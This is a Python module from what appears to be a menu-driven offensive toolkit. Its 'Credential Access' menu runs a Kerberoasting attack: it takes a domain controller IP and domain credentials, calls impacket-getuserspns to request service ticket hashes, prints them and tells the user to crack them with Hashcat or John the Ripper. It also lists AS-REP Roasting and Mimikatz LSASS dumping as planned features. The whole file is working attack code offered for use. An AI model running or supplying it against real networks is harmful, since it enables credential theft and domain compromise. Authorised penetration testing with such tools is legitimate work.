import subprocess
import shlex

def run():
    while True:
        print("\n--- Credential Access ---")
        print("1. Kerberoasting")
        print("2. (Coming Soon) AS-REP Roasting")
        print("3. (Coming Soon) Dump LSASS (Mimikatz)")
        print("99. Return to Main Menu")

        choice = input("Enter your choice: ")

        if choice == '1':
            target_ip = input("Enter Target IP (Domain Controller): ")
            domain = input("Enter Target Domain (e.g., contoso.local): ")
            username = input("Enter Username: ")
            password = input("Enter Password: ")
            kerberoast(target_ip, domain, username, password)
        elif choice == '99':
            print("Returning to main menu...")
            return
        else:
            print("Invalid choice. Please try again.")
            input("Press Enter to continue...")

def kerberoast(target_ip, domain, username, password):
    print("\n[+] Performing Kerberoasting attack...")
    
    # Format: domain/username:password
    credentials = f"{domain}/{username}:{password}"
    
    command = [
        "impacket-getuserspns",
        "-dc-ip", target_ip,
        "-request",
        credentials
    ]

    print(f"[*] Running command: {' '.join(command)}")

    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print("\n[+] Command executed successfully. Found crackable hashes:")
        print("-" * 60)
        print(result.stdout)
        print(result.stderr)
        print("-" * 60)
        print("[*] Copy the hash into a file and use Hashcat or John the Ripper to crack it.")

    except FileNotFoundError:
        print("\n[!] ERROR: 'impacket-getuserspns' not found.")
        print("[!] Please ensure impacket is installed and in your system's PATH.")
    except subprocess.CalledProcessError as e:
        print("\n[!] ERROR: Command failed. This might be expected if no SPNs were found.")
        print(f"[!] Return Code: {e.returncode}")
        print("[!] Stdout:")
        print(e.stdout)
        print("[!] Stderr:")
        print(e.stderr)
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")

    input("\nPress Enter to continue...")
